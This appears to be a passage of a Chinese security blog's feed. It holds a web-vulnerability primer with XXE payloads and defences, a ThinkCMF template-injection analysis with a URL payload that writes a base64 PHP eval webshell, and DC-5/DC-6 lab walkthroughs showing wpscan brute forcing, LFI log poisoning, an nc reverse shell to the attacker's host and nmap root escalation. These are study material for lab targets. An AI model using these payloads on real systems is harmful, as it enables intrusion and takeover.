title="udf提权"></a>udf提权</h4><p><strong>前提是已知mysql中root的账号密码</strong></p><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p><h4 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h4><p>MOF提权的条件要求十分严苛：</p><ol><li>windows 03及以下版本</li><li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li><li>secure-file-priv参数不为null</li></ol><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>xml外部实体注入(XML External Entity)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><h3 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h3><ol><li><p>任意文件读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure></li><li><p>SSRF/内网主机、端口探测</p><p><img src="/2019/11/04/WEB基础漏洞/2019-02-27.11.27.49-image.png" alt="Alt text"></p></li></ol><p>利用一些协议进行漏洞利用。</p><ol start="3"><li><p>命令执行<br>PHP环境下,xml命令执行要求php装有expect扩展。该扩展默认没有安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  $xml = &lt;&lt;&lt;EOF</span><br><span class="line">  &lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE ANY [</span><br><span class="line">      &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">  &lt;x&gt;&amp;f;&lt;/x&gt;</span><br><span class="line">  EOF;</span><br><span class="line">  $data = simplexml_load_string($xml);</span><br><span class="line">  print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><p>DDoS攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">    &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure></li></ol><p>当XML解析器加载这个文档时，他会看到它包含一个包含文本&lol9;的根元素,不过&lol9;是一个定义的实体,扩展包含十个&lol8;的字符串,每个&lol8;是一个定义的实体，扩展为十个&lol7;的字符串。因为许多XML解释器在解析XML文档时倾向于将它的整个结果保存在内存中，所以这个不到1kb的xml文件实际包含10亿个lol,占用几乎3GB的内存，造成DDOS攻击。</p><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><h3 id="禁用外部实体"><a href="#禁用外部实体" class="headerlink" title="禁用外部实体"></a>禁用外部实体</h3><p>各个语言都提供了禁用外部实体的方法<br>PHP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure></p><p>JAVA:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);  //几乎可以防御所有xml实体攻击</span><br><span class="line"></span><br><span class="line">//如果不能使用DTDs,可以使用以下两项,两项必须同时存在</span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false) //防止外部普通实体POC攻击</span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false); //防止外部参数实体POC攻击</span><br></pre></td></tr></table></figure></p><p>Python:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></p><h3 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h3><p>过滤关键字:<code>&lt;!DOCTYPE</code> 与<code>&lt;EMTITY</code>，或者<code>SYSTEM PUBLIC</code></p><p>可能存在被绕过的情况，如（过滤了&lt;EMTITY）Bypass:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg SYSTEM &quot;http://vps/xxe.dtd&quot;&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h3><ul><li>判断文件类型。在判断文件类型的时候，可以结合使用MIME Type，后缀检查等方式。</li><li>对上传的文件类型进行白名单、黑名单校验，只允许上传可靠类型。</li><li>采用随机数重命名文件，使攻击者无法猜想上传文件的访问路径。</li><li>限制上传文件的大小，避免恶意脚本，防止由于内存、磁盘耗尽而造成的拒绝服务攻击。</li><li>将文件上传的目录设置为不可执行。</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>CSRF（Cross Site Request Forgery，跨站请求伪造），字面理解意思就是在别的站点伪造了一个请求。专业术语来说就是在受害者访问一个网站时，其 Cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。<br> CSRF漏洞产生的主要原因：<br>请求所有的参数均可确定<br>请求的审核不严格，如：只验证了Cookie<br><img src="/2019/11/04/WEB基础漏洞/1572251126141.png" alt="Alt text"></p><h3 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h3><ul><li>篡改目标网站上的用户数据；</li><li>盗取用户隐私数据；</li><li>作为其他攻击向量的辅助攻击手法；</li><li>传播CSRF蠕虫。</li></ul><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>1，二次验证，进行重要敏感操作时，要求用户进行二次验证。</p><p>2，验证码，进行重要敏感操作时，加入验证码。</p><p>3，验证 HTTP 的 Referer 字段。</p><p>4，请求地址中添加 Token 并验证。</p><p>5，HTTP 头中自定义属性并验证。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h3 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h3><p>1、内网、本地端口扫描，获取开放端口信息<br>2、主机信息收集，web应用指纹识别，获取服务banner信息<br>3、根据识别出的应用针对性的发送payload攻击，例如struts2<br>4、攻击内网和本地的应用程序及服务。<br>5、穿越防火墙<br>6、利用file协议读取本地文件，比如file:///etc/passwd</p><h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ol><li><p>禁止跳转</p></li><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p></li><li><p>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p></li><li><p>限制请求的端口为http常用的端口，比如 80、443、8080、8090</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li></ol><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>服务端模板注入</p><h2 id="代码执行和命令执行"><a href="#代码执行和命令执行" class="headerlink" title="代码执行和命令执行"></a>代码执行和命令执行</h2><p>远程代码执行(Remote Command Execution)<br>远程命令执行(Remote Command Execution)</p><p>区别在于执行的是操作系统命令还是脚本代码。</p><h2 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h2><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>计划任务<br>写SSHkey</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/2019/11/04/WEB基础漏洞/WEB基础漏洞.png&quot; alt=&quot;Alt text&quot;&gt;&lt;br&gt;&lt;img src=&quot;/2019/11/04/WEB基础漏洞/挖洞思维导图.png&quot; alt=&quot;Alt text&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://www.twosmi1e.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="总结" scheme="https://www.twosmi1e.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="OWASP10" scheme="https://www.twosmi1e.com/tags/OWASP10/"/>
    
  </entry>
  
  <entry>
    <title>thinkCMF任意内容包含漏洞分析</title>
    <link href="https://www.twosmi1e.com/2019/10/25/thinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://www.twosmi1e.com/2019/10/25/thinkCMF任意内容包含漏洞分析/</id>
    <published>2019-10-25T09:03:40.000Z</published>
    <updated>2019-10-25T09:04:42.028Z</updated>
    
    <content type="html"><![CDATA[<h2 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h2><p>ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本。 官网:<a href="http://www.thinkcmf.com" target="_blank" rel="external">http://www.thinkcmf.com</a> 文档:<a href="http://www.thinkcmf.com/document" target="_blank" rel="external">http://www.thinkcmf.com/document</a></p><p>github地址：<a href="https://github.com/thinkcmf/cmfx" target="_blank" rel="external">https://github.com/thinkcmf/cmfx</a></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>可以构造请求包发送给服务器达到远程执行任意代码的效果。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先看下代码整体结构<br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/1571800580056.png" alt="Alt text"><br>项目路径在<code>application/</code>下<br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/1571824657057.png" alt="Alt text"><br>找到IndexController的代码，看到父类为<code>Common\Controller\HomebaseController</code><br>注意到其中的display()函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 加载模板和页面输出 可以返回输出内容</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string $templateFile 模板文件名</span><br><span class="line"> * @param string $charset 模板输出字符集</span><br><span class="line"> * @param string $contentType 输出类型</span><br><span class="line"> * @param string $content 模板输出内容</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">public function display($templateFile = &apos;&apos;, $charset = &apos;&apos;, $contentType = &apos;&apos;, $content = &apos;&apos;, $prefix = &apos;&apos;) &#123;</span><br><span class="line">parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>测试一下display函数<br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/1571881662351.png" alt="Alt text"><br><code>http://localhost:9094/?a=display&amp;templateFile=README.md</code><br>url中的参数，a代表action，指定你所要调用的public的function，后面为传入function的参数。<br>这里传入templateFile后，templateFile参数会经过parseTemplate函数处理，判断模板是否存在，当模板不存在时会在当前目录下开始查找。<br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/1571881730617.png" alt="Alt text"><br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/TIM截图20191024104240.png" alt="Alt text"></p><p>想要利用这个漏洞还需要上传漏洞上传webshell配合使用。</p><p>注意到下面的fetch函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 获取输出页面内容</span><br><span class="line"> * 调用内置的模板引擎fetch方法，</span><br><span class="line"> * @access protected</span><br><span class="line"> * @param string $templateFile 指定要调用的模板文件</span><br><span class="line"> * 默认为空 由系统自动定位模板文件</span><br><span class="line"> * @param string $content 模板输出内容</span><br><span class="line"> * @param string $prefix 模板缓存前缀*</span><br><span class="line"> * @return string</span><br><span class="line"> */</span><br><span class="line">public function fetch($templateFile=&apos;&apos;,$content=&apos;&apos;,$prefix=&apos;&apos;)&#123;</span><br><span class="line">    $templateFile = empty($content)?$this-&gt;parseTemplate($templateFile):&apos;&apos;;</span><br><span class="line">return parent::fetch($templateFile,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数功能是获取输出页面内容，调用smarty模板引擎中的内置fetch方法，我们知道smarty是存在模板注入的。<br><code>http://localhost:9094/?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=%3Cphp%3Efile_put_contents(%27test1.php%27,%27%3C?php%20phpinfo();%20?%3E%27)%3C/php%3E</code></p><p>执行payload传入参数<br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/1571883903239.png" alt="Alt text"><br>判断content不为空，把templateFile置为空。<br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/1571883994697.png" alt="Alt text"><br>这里看下我们的项目目录下面已经写入了文件。<br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/1571884282074.png" alt="Alt text"><br>再用之前的文件包含漏洞执行就可以了。<br><img src="/2019/10/25/thinkCMF任意内容包含漏洞分析/1571884468374.png" alt="Alt text"></p><p>写shell payload：<br><code>?a=fetch&amp;templateFile=public/index&amp;prefix=&#39;&#39;&amp;content=&lt;php&gt;file_put_contents(&#39;shell.php&#39;,base64_decode(&#39;PD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7Pz4=&#39;))&lt;/php&gt;</code></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>将 HomebaseController.class.php 和 AdminbaseController.class.php 类中 display 和 fetch 函数的修饰符由<code>public</code>改为<code>protected</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;项目简介&quot;&gt;&lt;a href=&quot;#项目简介&quot; class=&quot;headerlink&quot; title=&quot;项目简介&quot;&gt;&lt;/a&gt;项目简介&lt;/h2&gt;&lt;p&gt;ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架。ThinkCMF提出灵活的应用机制，框架自身提供基础的管
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="https://www.twosmi1e.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="漏洞分析" scheme="https://www.twosmi1e.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>DC-6渗透报告</title>
    <link href="https://www.twosmi1e.com/2019/10/24/DC-6%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/"/>
    <id>https://www.twosmi1e.com/2019/10/24/DC-6渗透报告/</id>
    <published>2019-10-24T08:55:34.000Z</published>
    <updated>2019-10-24T08:58:46.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2019/10/24/DC-6渗透报告/1562674228171.png" alt="Alt text"><br>靶机IP：192.168.61.147<br>nmap扫描<br><img src="/2019/10/24/DC-6渗透报告/1562675502630.png" alt="Alt text"></p><ul><li>80 web服务 WordPress站点</li><li>22 ssh服务</li></ul><p><img src="/2019/10/24/DC-6渗透报告/1562675723559.png" alt="Alt text"><br>wpscan扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate p --enumerate t --enumerate u</span><br></pre></td></tr></table></figure><p><img src="/2019/10/24/DC-6渗透报告/1562678105460.png" alt="Alt text"><br>发现了用户名<br><img src="/2019/10/24/DC-6渗透报告/1562678282100.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; dc6pass.txt</span><br></pre></td></tr></table></figure></p><p>然后开始爆破</p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U dc6user.txt -P dc6pass.txt</span><br></pre></td></tr></table></figure><p><img src="/2019/10/24/DC-6渗透报告/1562722179978.png" alt="Alt text"><br>找到密码<br>Username: mark, Password: helpdesk01<br>进入后台，有个插件 Activity  monitor<br><img src="/2019/10/24/DC-6渗透报告/1562722431942.png" alt="Alt text"></p><p><img src="/2019/10/24/DC-6渗透报告/1562722506150.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 45274.html</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/24/DC-6渗透报告/1562723794984.png" alt="Alt text"><br>改一下这两处改成域名和kali的IP，然后本地访问<br><img src="/2019/10/24/DC-6渗透报告/1562723921123.png" alt="Alt text"><br>shell反弹回来，收集信息<br>找了半天找到一个提示<br><img src="/2019/10/24/DC-6渗透报告/1562724128229.png" alt="Alt text"><br>有graham的密码<br>Add new user: graham - GSo7isUM1D4 - done<br>切换用户 发现没有root权限的应用但是有jens的<br><img src="/2019/10/24/DC-6渗透报告/1562724335219.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:/home/mark/stuff$ cat /home/jens/backups.sh</span><br><span class="line">cat /home/jens/backups.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">tar -czf backups.tar.gz /var/www/html</span><br></pre></td></tr></table></figure></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>想到还开了22端口，用graham尝试连了一下，成功<br>这样操作比反弹的shell方便一点<br>用vim或者vi无法操作，用nano在后面添加一行<br><img src="/2019/10/24/DC-6渗透报告/1562725153838.png" alt="Alt text"><br>然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:~$ sudo -u jens /home/jens/backups.sh</span><br><span class="line">jens@dc-6:/home/graham$ sudo -l</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/24/DC-6渗透报告/1562725388880.png" alt="Alt text"><br>可以看到切换到了jens用户，<code>/usr/bin/nmap</code>有root权限<br>然后可以利用nmap来提权<br>参考链接：<a href="https://gtfobins.github.io/gtfobins/nmap/" target="_blank" rel="external">https://gtfobins.github.io/gtfobins/nmap/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:/home/graham$ echo &quot;os.execute(&apos;/bin/sh&apos;)&quot;&gt;/tmp/root.nse</span><br><span class="line">jens@dc-6:/home/graham$ sudo nmap --script=/tmp/root.nse</span><br></pre></td></tr></table></figure></p><p>提权成功找到flag<br><img src="/2019/10/24/DC-6渗透报告/1562725924391.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2019/10/24/DC-6渗透报告/1562674228171.png&quot; alt=&quot;Alt tex
      
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://www.twosmi1e.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DC-5渗透报告</title>
    <link href="https://www.twosmi1e.com/2019/10/24/DC-5%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/"/>
    <id>https://www.twosmi1e.com/2019/10/24/DC-5渗透报告/</id>
    <published>2019-10-24T08:54:37.000Z</published>
    <updated>2019-10-24T08:57:29.713Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.61.0</span><br></pre></td></tr></table></figure><p><img src="/2019/10/24/DC-5渗透报告/1562640360347.png" alt="Alt text"><br>靶机IP 192.168.61.146<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.61.146 -p 1-65535</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/24/DC-5渗透报告/1562640516948.png" alt="Alt text"></p><ul><li>80 web服务 容器nginx 1.6.2</li><li>111 rpc</li></ul><p>contact的页面提交参数可控<br><img src="/2019/10/24/DC-5渗透报告/1562640981031.png" alt="Alt text"></p><p>而且不停刷新下面的年份会变<br><img src="/2019/10/24/DC-5渗透报告/1562642352942.png" alt="Alt text"><br><img src="/2019/10/24/DC-5渗透报告/1562642365248.png" alt="Alt text"></p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><p>fuzz一下<br>字典wfuzz中就有 网上也有一些<br><a href="https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI" target="_blank" rel="external">https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI</a><br><a href="https://github.com/tennc/fuzzdb" target="_blank" rel="external">https://github.com/tennc/fuzzdb</a><br><img src="/2019/10/24/DC-5渗透报告/1562660635520.png" alt="Alt text"><br>发现接受<code>file</code>这个参数<br>有<code>LFI</code><br>/etc/passwd<br><img src="/2019/10/24/DC-5渗透报告/1562643753035.png" alt="Alt text"><br> /var/log/nginx/access.log<br><img src="/2019/10/24/DC-5渗透报告/1562643833264.png" alt="Alt text"><br>日志会记录请求，那么可以直接请求一句话，然后存到日志文件中连接<br><code>http://192.168.61.146/thankyou.php?file=&lt;?php system($_get[&#39;test&#39;]) ?&gt;</code><br><code>http://192.168.61.146/thankyou.php?file=/var/log/nginx/error.log&amp;test=id</code></p><h2 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h2><p>emmm 不知道为什么没有成功，换个方法反弹个shell回来<br>在kali上发送请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A &quot;&lt;?= system(&apos;nc -nv 192.168.61.142 1234 -e /bin/sh&apos;); ?&gt;&quot; http://192.168.61.146/thankyou.php</span><br></pre></td></tr></table></figure><p><img src="/2019/10/24/DC-5渗透报告/1562666845842.png" alt="Alt text"><br>然后监听1234端口，再次访问access.log时反弹shell回来<br><img src="/2019/10/24/DC-5渗透报告/1562666889077.png" alt="Alt text"><br>绕过Linux受限Shell环境的技巧：<br><a href="https://xz.aliyun.com/t/2333" target="_blank" rel="external">https://xz.aliyun.com/t/2333</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/24/DC-5渗透报告/1562668372462.png" alt="Alt text"><br>找一下有SUID权限的文件<br><a href="https://mochazz.github.io/2018/06/09/Linux%E6%8F%90%E6%9D%83%E4%B9%8BSUID/" target="_blank" rel="external">https://mochazz.github.io/2018/06/09/Linux%E6%8F%90%E6%9D%83%E4%B9%8BSUID/</a><br><a href="https://www.howtoing.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux" target="_blank" rel="external">https://www.howtoing.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux</a></p><figure class="highlight plain"><table><tr><td 